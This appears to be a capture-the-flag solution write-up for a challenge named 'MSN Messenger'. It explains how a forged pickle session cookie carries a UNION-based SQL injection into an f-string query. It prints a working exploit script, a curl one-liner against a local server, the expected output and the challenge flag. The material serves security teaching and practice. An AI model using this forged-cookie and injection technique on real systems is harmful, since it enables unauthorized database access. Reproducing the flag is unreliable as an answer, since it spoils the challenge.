# Solution: MSN Messenger

## Vulnerability: Insecure Deserialization + Second-Order SQL Injection

The challenge requires chaining two vulnerabilities:

1. **Pickle deserialization** — The session cookie is a base64-encoded pickle object.
   A `RestrictedUnpickler` blocks dangerous modules (`os`, `subprocess`, etc.) but
   **allows the `UserSession` namedtuple** to be constructed with arbitrary field values.

2. **Second-order SQL injection** — The `/api/profile` endpoint reads the `username`
   from the deserialized session and passes it into `get_user_profile()`, which uses
   an **f-string to build a raw SQL query**. Under normal operation, the username is
   always a clean string from the database — but via a crafted pickle, the attacker
   controls the value.

## Why Each Vulnerability Alone Is Insufficient

- **Pickle alone**: The `RestrictedUnpickler` only allows `UserSession`, basic Python
  types, and `OrderedDict`. You cannot call `os.system()`, `subprocess.Popen()`, or
  any other dangerous function. Direct RCE is blocked.

- **SQLi alone**: The login and signup forms use parameterized queries (`?` placeholders).
  The vulnerable f-string query in `get_user_profile()` is only reachable through the
  deserialized session — there's no direct user input path to it.

## Exploit

### Step 1: Understand the Session Cookie

From `server.py` and `restricted_unpickler.py`:

```python
UserSession = namedtuple('UserSession', ['username', 'display_name', 'login_time'])

# Session creation:
session = UserSession(username=user['username'], ...)
cookie = base64.b64encode(pickle.dumps(session)).decode()

# Session loading:
data = base64.b64decode(cookie_value)
session = RestrictedUnpickler(io.BytesIO(data)).load()
```

The `RestrictedUnpickler` allows `('restricted_unpickler', 'UserSession')`.

### Step 2: Identify the SQL Injection

In `server.py`, the `get_user_profile()` function:

```python
query = f"""
    SELECT
        u.username,
        u.display_name,
        u.status_message,
        u.created_at,
        (SELECT COUNT(*) FROM messages m WHERE m.from_user = u.username) as msg_count
    FROM users u
    WHERE u.username = '{username}'"""
```

The `{username}` comes directly from `session.username` — which we control via pickle.

### Step 3: Craft the Exploit

The key challenge is making pickle serialize the `UserSession` namedtuple with the
module path `restricted_unpickler.UserSession` (since that's what the whitelist allows).
We do this by creating a fake module in `sys.modules`:

```python
import pickle
import base64
import sys
import types
from collections import namedtuple

# Recreate the namedtuple the server uses
UserSession = namedtuple('UserSession', ['username', 'display_name', 'login_time'])

# Register it under the module name the RestrictedUnpickler expects
mod = types.ModuleType('restricted_unpickler')
mod.UserSession = UserSession
sys.modules['restricted_unpickler'] = mod
UserSession.__module__ = 'restricted_unpickler'

# UNION-based SQL injection
# The original query SELECTs 5 columns, so our UNION must also have 5
sqli_username = "' UNION SELECT key, value, 'pwned', 'now', 1337 FROM admin_secrets--"

malicious_session = UserSession(
    username=sqli_username,
    display_name='hacker',
    login_time='01/01/1999'
)

payload = base64.b64encode(pickle.dumps(malicious_session)).decode()
print(f"Cookie payload:\n{payload}")
```

### Step 4: Send the Request

```bash
# Replace <PAYLOAD> with the base64 output from the script above
curl -b "msn_session=<PAYLOAD>" http://localhost:1338/api/profile
```

### Expected Response

```json
{
    "username": "flag",
    "display_name": "RowdyCTF{p1ckl3_m3_th1s_MSN_s4ys_wh4t}",
    "status": "pwned",
    "joined": "now",
    "messages_sent": 1337
}
```

The flag appears in the `display_name` field because the UNION maps the `value` column
from `admin_secrets` (which contains the flag) to the second SELECT position
(`u.display_name`).

## One-Liner Exploit

```bash
python3 -c "
import pickle,base64,sys,types
from collections import namedtuple
U=namedtuple('UserSession',['username','display_name','login_time'])
m=types.ModuleType('restricted_unpickler');m.UserSession=U
sys.modules['restricted_unpickler']=m;U.__module__='restricted_unpickler'
s=U(\"' UNION SELECT key,value,'x','x',1 FROM admin_secrets--\",'x','x')
print(base64.b64encode(pickle.dumps(s)).decode())
" | xargs -I{} curl -s -b "msn_session={}" http://localhost:1338/api/profile
```

## Key Concepts

- **Python Pickle**: A serialization format that can execute arbitrary code during
  deserialization. `RestrictedUnpickler` mitigates this by whitelisting allowed classes,
  but allowing application-defined types (like `UserSession`) with attacker-controlled
  string fields creates a bypass when those strings flow into other vulnerable sinks.

- **Second-Order Injection**: The SQL injection payload doesn't come from direct user
  input — it's injected via the deserialized session object. This is "second-order"
  because the malicious data passes through an intermediary (the pickle cookie) before
  reaching the vulnerable SQL query.

- **Namedtuple Trust Assumption**: The developer assumed that because `UserSession` is
  "their" type, the data inside it must be clean. But the pickle format lets you
  construct any allowed type with any field values.

## Flag

```
RowdyCTF{p1ckl3_m3_th1s_MSN_s4ys_wh4t}
```
